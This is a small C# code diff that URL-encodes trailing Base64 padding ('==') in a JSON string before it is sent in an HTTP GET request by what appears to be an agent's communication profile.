@@ -158,6 +158,11 @@ namespace Agent.Profiles
 
                 if (json.Length < 2000) //Max URL length
                 {
+                    // If there are trailing "==" (Base64 padding) at the end of the string, URL-encode them as "%3D%3D"
+                    if (json.EndsWith("=="))
+                    {
+                        json = json.Substring(0, json.Length - 2) + "%3D%3D";
+                    }
                     response = await this._client.GetAsync(this.getURL + json.Replace('+', '-').Replace('/', '_'), cancellationTokenSource.Token);
                 }
                 else
